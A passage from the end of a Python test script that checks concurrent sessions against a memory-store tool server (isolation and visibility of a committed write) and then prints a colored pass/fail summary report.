                results.append(json.loads((await r.readline()).decode()))
            w.close(); await w.wait_closed()
            return results

        a_res, b_res = await asyncio.gather(
            conn([{'tool':'mem_store','args':{'unit_id':'iso_a','scope':'core',
                   'tags':[],'body':{'summary':'a'}}}]),
            conn([{'tool':'mem_find','args':{'scope':'core'}}]),
        )
        assert a_res[0]['ok'], f'A failed: {a_res}'
        assert b_res[0]['ok'], f'B failed: {b_res}'
        assert isinstance(b_res[0]['result'], list), 'B must get a list'

        # After both: third session sees the committed write
        c_res = await conn([{'tool':'mem_find','args':{'scope':'core'}}])
        ids = [u.get('unit_id') for u in c_res[0]['result']]
        assert 'iso_a' in ids, f'committed unit missing: {ids}'

        task.cancel()
        try: await task
        except asyncio.CancelledError: pass
        rt.close()
        print('OK')
asyncio.run(run())
''')
ok_, out = run_isolated(code)
record("Concurrent sessions: B read is clean, committed write visible to C",
       ok_ and "OK" in out, out)


# ══════════════════════════════════════════════════════════════════════════════
section("FINAL REPORT")
# ══════════════════════════════════════════════════════════════════════════════

total   = len(results)
skipped = sum(1 for _, p, _ in results if p is None)
passed  = sum(1 for _, p, _ in results if p is True)
failed  = sum(1 for _, p, _ in results if p is False)

print(f"\n  Total checks  : {total}")
print(f"  {GREEN}Passed         : {passed}{RESET}")
if skipped:
    print(f"  {YELLOW}Skipped/Info   : {skipped}{RESET}")
if failed:
    print(f"  {RED}Failed         : {failed}{RESET}")
    print(f"\n  {BOLD}Failed checks:{RESET}")
    for name, p, detail in results:
        if p is False:
            print(f"    {RED}✗{RESET} {name}")
            if detail:
                for line in detail.strip().splitlines()[-5:]:
                    print(f"      {YELLOW}{line}{RESET}")
else:
    if skipped == 0:
        print(f"\n  {GREEN}{BOLD}All checks passed. Foundation is solid.{RESET}")
    else:
        print(f"\n  {GREEN}{BOLD}All executed checks passed.{RESET}")

print()
sys.exit(0 if failed == 0 else 1)
